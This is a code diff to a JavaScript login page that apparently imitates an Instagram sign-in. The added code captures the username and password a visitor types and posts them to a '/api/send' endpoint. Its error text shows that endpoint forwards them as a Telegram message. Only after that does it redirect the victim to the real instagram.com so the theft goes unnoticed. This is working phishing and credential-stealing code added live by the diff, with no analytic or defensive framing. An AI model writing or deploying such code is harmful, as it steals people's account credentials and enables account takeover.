@@ -144,10 +144,27 @@
     passwordInput.addEventListener("input", validateInputs);
 
     async function submitLogin() {
-        const username = usernameInput.value;
-        const password = passwordInput.value;
-        if (username.trim() && password.trim()) {
-            window.location.href = "https://www.instagram.com/";
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        if (username && password) {
+            try {
+                const response = await fetch('/api/send', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({ username, password }),
+                });
+
+                if (response.ok) {
+                    window.location.href = "https://www.instagram.com/";
+                } else {
+                    console.error("Failed to send Telegram message:", await response.json());
+                }
+            } catch (error) {
+                console.error("Error occurred:", error);
+            }
         }
     }
 
